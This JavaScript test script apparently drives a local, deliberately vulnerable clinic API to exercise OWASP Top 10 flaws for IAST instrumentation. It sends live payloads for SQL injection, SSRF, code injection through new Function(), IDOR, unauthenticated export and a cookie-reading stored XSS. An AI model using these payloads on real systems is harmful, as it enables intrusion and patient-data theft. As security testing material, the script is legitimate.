/**
 * Exercises every OWASP Top 10:2025 vulnerability against a running,
 * IAST-instrumented backend. Uses Node's built-in fetch so this runs
 * identically in CI (Linux) and locally (Windows, Mac, Linux).
 */
const BASE = process.env.API_BASE || 'http://localhost:4000/api';

async function login(email) {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password: 'Password123!' }),
  });
  const data = await res.json();
  if (!data.token) throw new Error(`Login failed for ${email}: ${JSON.stringify(data)}`);
  return data.token;
}

function authHeaders(token) {
  return { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' };
}

async function main() {
  console.log('Logging in as admin and two doctors...');
  const adminToken = await login('admin@clinic.test');
  const doctorA = await login('dr.reyes@clinic.test');
  const doctorB = await login('dr.akashpatel@clinic.test');

  console.log('Discovering a real patient assigned specifically to doctor A...');
  const myPatientsRes = await fetch(`${BASE}/doctors/me/patients`, { headers: authHeaders(doctorA) });
  const myPatientsData = await myPatientsRes.json();
  const patients = myPatientsData.patients || [];
  if (patients.length === 0) throw new Error('Doctor A has no assigned patients - has seed data been applied?');
  const patientId = patients[0].id;
  console.log(`Using patient id ${patientId} (confirmed assigned to doctor A) for the rest of this run.`);

  console.log('A05 - SQL injection...');
  await fetch(`${BASE}/patients/search?q=' OR '1'='1`, { headers: authHeaders(doctorA) });

  console.log('A02 - Verbose error (malformed query)...');
  await fetch(`${BASE}/patients/search?q=%27`, { headers: authHeaders(doctorA) });

  console.log('A01 - SSRF...');
  await fetch(`${BASE}/patients/${patientId}/lab-results/fetch`, {
    method: 'POST',
    headers: authHeaders(doctorA),
    body: JSON.stringify({ url: `${BASE}/health` }),
  });

  console.log('A08 - Code injection via new Function()...');
  await fetch(`${BASE}/admin/import`, {
    method: 'POST',
    headers: authHeaders(adminToken),
    body: JSON.stringify({
      patients: [{ full_name: 'Test Patient' }],
      transform: 'return { pwned: true };',
    }),
  });

  console.log('A10 - Fail-open export (no token)...');
  await fetch(`${BASE}/patients/${patientId}/export`);

  console.log('A06 - Predictable password reset token...');
  await fetch(`${BASE}/auth/forgot-password`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'dr.reyes@clinic.test' }),
  });

  console.log('A01 - IDOR (doctor B reads a patient assigned to doctor A)...');
  await fetch(`${BASE}/patients/${patientId}`, { headers: authHeaders(doctorB) });

  console.log('A05 - Stored XSS (functional check only - the real sink is client-side, outside backend IAST reach)...');
  await fetch(`${BASE}/patients/${patientId}/notes`, {
    method: 'POST',
    headers: authHeaders(doctorA),
    body: JSON.stringify({ content: '<script>alert(document.cookie)</script>' }),
  });

  console.log('Exercise script completed.');
}

main().catch((err) => {
  console.error('Exercise script failed:', err.message);
  process.exit(1);
});
